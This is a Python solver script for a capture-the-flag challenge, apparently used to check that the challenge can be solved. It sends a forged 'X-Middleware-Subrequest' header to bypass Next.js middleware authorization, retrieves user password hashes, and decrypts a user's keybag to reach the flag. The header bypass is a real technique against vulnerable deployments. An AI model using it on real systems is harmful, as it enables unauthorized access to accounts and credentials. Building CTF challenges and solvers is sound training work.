import base64
import sys
import os.path
import json

sys.path.append(os.path.join(os.path.dirname(__file__), "../../../tools"))
import utils as ctfutils
del sys.path[-1]
import requests

def decode_unpadded_base64(s):
    missing_padding = len(s) % 4
    if missing_padding:
        s += '=' * (4 - missing_padding)
    return base64.urlsafe_b64decode(s)

def try_crack(pwhash):
    # this simulates offline cracking, players will not have this
    known_pw = "banditthedog"
    try:
        import bcrypt
        if not bcrypt.checkpw(known_pw.encode('utf-8'), pwhash.encode('utf-8')):
            raise ValueError("bad password for hash!")
    except ImportError:
        print("no bcrypt, skipping")    
    return known_pw

def try_load_keybag(username, password, keybagdata):
    try:
        import nacl.hash
        import nacl.pwhash
        import nacl.bindings.crypto_pwhash
        import nacl.secret
        import nacl.encoding
    except ImportError:
        print("could not import nacl, assuming success")
        return True
    # derive user key
    usersalt = nacl.hash.generichash(
        username.encode('utf-8'), nacl.bindings.crypto_pwhash_SALTBYTES, encoder=nacl.encoding.RawEncoder)
    userkey = nacl.bindings.crypto_pwhash_alg(
        nacl.secret.SecretBox.KEY_SIZE,
        password.encode('utf-8'),
        usersalt,
        nacl.bindings.crypto_pwhash.crypto_pwhash_argon2id_OPSLIMIT_MODERATE,
        nacl.bindings.crypto_pwhash.crypto_pwhash_argon2id_MEMLIMIT_MIN*4,
        nacl.bindings.crypto_pwhash.crypto_pwhash_ALG_ARGON2ID13
    )
    salt = decode_unpadded_base64(keybagdata["salt"])
    ciphertext = decode_unpadded_base64(keybagdata["keybag"])
    box = nacl.secret.SecretBox(userkey)
    res = box.decrypt(ciphertext, salt)
    return res

def solve(endpoint, expected_flag):
    # Find the user info
    endpoint = endpoint.rstrip("/")
    users_api = f"{endpoint}/api/users"
    mw_header = {'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'}
    json_headers = {'accept': 'application/json'}
    resp = requests.get(users_api, headers=mw_header|json_headers)
    body = resp.json()
    #print(body)
    for u in body:
        if u["username"] == "bingo":
            bingo = u
            break
    else:
        print("Bingo not found!")
        return False
    plain_pass = try_crack(u["passwordHash"])
    keybag_api = f"{endpoint}/api/keybag/bingo"
    resp = requests.get(keybag_api, headers=json_headers|mw_header)
    body = resp.json()
    #print(body)
    keybag = try_load_keybag("bingo", plain_pass, body)
    if not keybag:
        print("keybag failed")
        return False
    if keybag is True:
        print("could not read keybag contents, skipping")
        return True
    print(keybag)
    kbdata = json.loads(keybag)
    for pwentry in kbdata:
        if pwentry["username"] == "flag":
            if pwentry["password"] == expected_flag:
                return True
            else:
                print("flag mismatched, found {}, expected {}".format(pwentry["password"], expected_flag))
                return False
    print("flag key not found")
    return False

def main(argv):
    challname = ctfutils.get_challenge_from_dir()
    ctfutils.fix_directory()
    config = ctfutils.load_config()
    if len(argv) > 0:
        endpoint = argv[0]
    else:
        endpoint = ctfutils.get_secret_hostname(challname, config['hostname_secret'])
    if not endpoint.startswith("http:") and not endpoint.startswith("https:"):
        if "bsidessf.net" in endpoint:
            endpoint = f"https://{endpoint}/"
        else:
            endpoint = f"http://{endpoint}/"
    flag = config['challenges'][challname]['flag']
    if solve(endpoint, flag):
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == '__main__':
    main(sys.argv[1:])